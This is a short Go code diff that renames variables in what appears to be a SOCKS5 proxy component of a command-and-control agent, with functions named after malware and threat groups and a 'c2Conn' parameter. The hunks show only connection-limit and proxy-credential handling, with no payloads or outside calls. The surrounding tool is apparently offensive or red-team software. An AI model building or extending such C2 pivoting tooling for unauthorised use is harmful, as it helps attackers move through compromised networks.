@@ -15,7 +15,7 @@ import (
 // ============================================================================
 
 // muddywater starts a SOCKS5 proxy server on the specified port.
-// Limits concurrent connections to lazarusMax (100) to prevent resource exhaustion.
+// Limits concurrent connections to maxSessions (100) to prevent resource exhaustion.
 // Parameters:
 //   - port: TCP port to bind the SOCKS5 proxy to
 //   - c2Conn: C2 connection (unused, kept for interface consistency)
@@ -50,7 +50,7 @@ func muddywater(port string, c2Conn net.Conn) error {
 				}
 				return
 			}
-			if atomic.LoadInt32(&lazarusCount) >= lazarusMax {
+			if atomic.LoadInt32(&lazarusCount) >= maxSessions {
 				conn.Close()
 				continue
 			}
@@ -90,8 +90,8 @@ func trickbot(clientConn net.Conn) {
 		return
 	}
 	socksCredsMutex.RLock()
-	currentUser := socksUsername
-	currentPass := socksPassword
+	currentUser := proxyUser
+	currentPass := proxyPass
 	socksCredsMutex.RUnlock()
 	requireAuth := currentUser != "" && currentPass != ""
 	if requireAuth {
